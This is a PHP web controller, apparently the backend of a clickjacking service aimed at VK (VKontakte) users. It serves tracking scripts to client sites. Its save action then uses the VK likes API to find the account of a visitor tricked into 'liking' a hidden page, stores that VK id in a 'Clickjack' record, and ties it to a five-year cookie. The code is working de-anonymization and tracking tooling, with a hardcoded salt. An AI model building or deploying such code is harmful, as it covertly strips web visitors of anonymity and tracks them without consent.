<?php

    namespace app\controllers;

    use app\components\inheritance\DefinitionsComponent;
    use app\models\Domain;
    use app\models\Clickjack;
    use app\models\Client;

    //TODO: need to delete, deprecated not used in project

    class ScriptController extends DefinitionsComponent
    {
        public $homeUrl = 'http://wellgo.clientwizard.ru';
        public $homeDomain = 'wellgo.clientwizard.ru';
        public $appId = '4554572';
        public $host;
        public $groupId;
        public $salt = '&^%#$(*(%(!@#)!@#;;';
        public $cookieName = 'cwuid';
        public $cookieExpires = 157680000; // 86400*365*24;

        public function getDomain() {
            if (!empty($_SERVER['HTTP_HOST']) && preg_match("/[a-zA-Zа-яА-Я0-9\-\.]+/uis", $_SERVER['HTTP_HOST'])) {
                $Domain = Domain::find(['host' => $_SERVER['HTTP_HOST']])->one();

                if (!empty($Domain) && $Domain->isActive()) {
                    return $Domain;
                }
            }

            return false;
        }

        public function actionJ1() {
            if ($this->getDomain())
            {
                header('Content-Type: text/javascript');

                $this->data->homeUrl = $this->homeUrl;
                $this->data->appId = $this->appId;

                return $this->renderPartial('j-1');
            }

            return '';
        }

        public function actionJ2() {
            if ($this->getDomain())
            {
                $this->data->homeUrl = $this->homeUrl;
                $this->data->appId = $this->appId;

                header('Content-Type: text/javascript');

                return $this->renderPartial('j-2');
            }

            return '';
        }

        public function actionJ3() {
            if ($this->getDomain())
            {
                $this->data->homeUrl = $this->homeUrl;
                $this->data->appId = $this->appId;
                $this->data->groupId = rand(1,99999999);
                $this->data->host = $this->homeUrl;

                return $this->renderPartial('j-3');
            }

            return '';
        }

        public function actionAuth() {
            return 'ok';
        }

        public function actionSave()
        {
            $Domain = $this->getDomain();
            if ($Domain)
            {
                $host = $this->homeUrl;
                $groupId = $_POST['guid'];

                $decoded = @json_decode(@file_get_contents('https://api.vk.com/method/likes.getList?type=sitepage&owner_id='.$this->appId.'&page_url='.$host.'?mypp='.$groupId));

                $mycc = $decoded->response->users[0];

                # Сохраняем кликджек
                $ClickJack = new Clickjack();
                $ClickJack->type = 'vk';
                $ClickJack->user_id = $Domain->user_id;
                $ClickJack->domain_id = $Domain->id;
                $ClickJack->vk_id = $mycc;
                $ClickJack->creation_time = date('Y-m-d H:i:s');
                $ClickJack->save();

                # Чекаем юзера
                $Client = Client::find(['MD5(vk_id)'=>md5($ClickJack->vk_id)])->one();
                if (empty($Client)) {
                    $Client = new Client();
                    $Client->vk_id = $ClickJack->vk_id;
                    $Client->creation_time = date('Y-m-d H:i:s');
                    $Client->save();
                }

                # Ставим куку
                $CookieName = md5($Client->id . $this->salt);
                $CookieNameBase64 = base64_encode($CookieName);
                setcookie($this->cookieName, $CookieNameBase64, time()+$this->cookieExpires, '/', $this->homeDomain, false, true);

                # Привязываем куку к клиенту
                if (empty($Client->cookie) || $Client->cookie != $CookieName) {
                    $Client->cookie = $CookieName;
                    $Client->save();
                }

                return 'ok';
            }

            return 'error';
        }
    }


?>